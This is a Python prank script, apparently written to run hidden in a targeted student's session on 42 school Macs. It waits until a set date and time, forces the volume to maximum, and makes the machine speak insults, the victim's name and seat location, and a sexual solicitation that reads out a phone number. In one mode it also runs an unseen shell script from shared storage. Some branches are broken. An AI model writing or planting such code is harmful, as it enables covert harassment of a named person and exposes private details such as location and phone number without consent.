import sys
import os
import time
from random import randrange
from APIlib import api42
from datetime import datetime
import json

_minute = 19
onliuser = "appachio" #"zjroundi"
Custom = 1

class configP:
    active = 0
    def __init__(self, active):
        self.active = active

def delayS(_time, _intervale):
    count = 0
    while (count <= _time):
        time.sleep(_intervale)
        count += _intervale
        os.system("osascript -e " + '"' + "set volume output volume 100" + '"' + ";")



def Troll1(_API):
    time.sleep(1) 
    _API.loadUProfile(_API.getRandomProche())

    phrases = [
            "Pour un max de sensation, Envoyer sexe, au  %phone",
            ]
    phrase = phrases[randrange(len(phrases))].replace("%phone", _API.getUnum())

    os.system("afplay -v 0.2 /sgoinfre/goinfre/Perso/correc/.MusAmb.m3r&")
    delayS(5, 0.5)
    os.system("say -v amelie " + phrase  + "&")
    delayS(11, 0.5)
    os.system("afplay -v 0.2 /sgoinfre/goinfre/Perso/correc/.MusAmb.m3r&")
    delayS(5, 0.5)
    os.system("say -v amelie " + phrase  + "&")
    delayS(11, 0.5)








def Troll2(_API):
    os.system("afplay -v 0.2 /sgoinfre/goinfre/Perso/correc/.MusFun.m3r&")
    delayS(5, 0.5)
    if (_API.getsexe() == 0):
        os.system("say -v thomas Trop bien, je suis trop fort je mappelle "+  _API.getDisplayName() + ", et je suis levels " + _API.getlevels()+"&")
        delayS(7, 0.5)
        os.system("say -v thomas Je suis vraiment le plus fort, venez me voir, je suis"+_API.getPos()+"&")
        delayS(7, 0.5)
    else:
        os.system("say -v amelie Trop bien, je suis trop forte je mappelle "+  _API.getDisplayName() + ", et je suis levels " + _API.getlevels()+"&")
        delayS(7, 0.5)
        os.system("say -v amelie Je suis vraiment la plus forte, venez me voir, je suis"+_API.getPos()+"&")
        delayS(7, 0.5)

def Troll3(_API):

    time.sleep(0.6)
    log = _API.getRandomProche()
    _API.loadUProfile(log)

    phrases = [
            "Ta guele, %name",
            ]
    phrase = phrases[randrange(len(phrases))].replace("%name", _API.getUDisplayName())

    sexe = _API.getUsexe()
    voix = (sexe == 0) * "thomas" + (sexe == 1) * "amelie"

    delayS(0.8, 0.5)
    os.system("say -v " + voix + " " + phrase + "&")
    delayS(4, 0.5)









def Troll4(_API):
    if (_API.getsexe() == 0):
        os.system("say -v thomas Je suis "+ _API.getDisplayName() +", et je vous partage ma chanson praifairee, Vous etes pret ?"+"&")
        delayS(5.5, 0.5)
        os.system("say -v thomas 3, 2, 1, sai est parti!"+"&")
        delayS(4, 0.5)
        os.system("afplay -v 1 /sgoinfre/goinfre/Perso/correc/.MoiJai.m3r&")
        delayS(20, 0.5)

    else:
        os.system("say -v thomas Je suis "+ _API.getDisplayName() +", et je vous partage ma chanson praifairee, Vous etes pret ?"+"&")
        delayS(5.5, 0.5)
        os.system("say -v thomas 3, 2, 1, sai parti!"+"&")
        delayS(4, 0.5)
        os.system("afplay -v 1 /sgoinfre/goinfre/Perso/correc/.MoiJai.m3r&")
        delayS(20, 0.5)



def Troll5():
    phrases = [
            "Le bocal vous surveille",
            "Le bocal est Faquin",
            "Il ny a pas de system infahible",
            "Proute",
            "Couille",
            ]
    phrase = phrases[randrange(len(phrases))]
    os.system("say -v thomas " + phrase + "&")
    delayS(4, 0.5)

def Troll6():
    for i in range (642):
        os.system("say -v thomas " + str(i) + "&")
        delayS(0.6, 0.5)


def CustomAction():
    #os.system("curl -fsSL https://cdn.intra.42.fr/users/large_"+victime_l+".jpg > ~/goinfre/img.jpg")
    os.system("bash /sgoinfre/goinfre/Perso/correc/scsc.sh")
    #delayS(30, 0.5)
    #os.system("afplay -v 0.2 /sgoinfre/goinfre/Perso/correc/ShSt.mp3&")
    #delayS(30, 0.5)
    #delayS(0.5, 0.5)
    #os.system("say -v thomas Est ce aue il reste des gens&")
    #delayS(2, 0.5)


def is_date():
    _date = datetime.now()
    day = int(_date.strftime("%d"))
    hour = int(_date.strftime("%H"))
    minute = int(_date.strftime("%M"))
    if (day == 17 and hour == 1 and minute >= 22):
        return 1
    if (day == 17 and hour > 1):
        return 1
    if (day > 17):
        return 1
    return 0



blackList = [
        "apingard",
        "yaboudra",
        "akerloc-",
        "ibenouha",
        "nifrei",
        "sachetri"
        ]


resCMD = os.popen('ps -o comm | grep python | grep -v grep | wc -l | tr -d \" \" | tr -d \"\n\"').read()
nbPythonOuv = int(resCMD)
if (nbPythonOuv >= 2):
    exit()

victime_l = os.environ['USER']


ConfigFile = open('/sgoinfre/goinfre/Perso/correc/config.gt',  'r')
ConfigFileJ = json.loads(ConfigFile.read())
_config = configP(int(ConfigFileJ['ON']))
ConfigFile.close()

while (1):
    time.sleep(3);
    if (onliuser != ""):
        if (onliuser != victime_l):
            continue
    else:
        if(victime_l in blackList):
            continue

    if(_config.active != 1):
        continue
    if (is_date() == 0):
        continue
    _date = datetime.now()

    RandomMin = randrange(60)
    RandomMin = _minute

    while (int(_date.strftime("%M")) != RandomMin):
        time.sleep(10)
        _date = datetime.now()
    hour = int(_date.strftime("%H"))

    sec = randrange(60 - int(_date.strftime("%S"))) + int(_date.strftime("%S"))
    while (int(_date.strftime("%S")) != sec):
        _date = datetime.now()
        time.sleep(0.6)


    _API = api42(victime_l)
    time.sleep(0.6)
    _API.loadLocation()

    RandTroll = randrange(100) + 1
    if (Custom == 0):
        if RandTroll <= 20:
            Troll3(_API)
        elif RandTroll <= 40:
            Troll3(_API)
        elif RandTroll <= 65:
            Troll3(_API)
        elif RandTroll <= 75:
            Troll3(_API)
        elif RandTroll <= 90:
            Troll3()
        elif RandTroll <= 100:
            Troll3()
    else:
        CustomAction()
    
    _date = datetime.now()
    while (int(_date.strftime("%H")) == hour):
        _date = datetime.now()
        time.sleep(10)

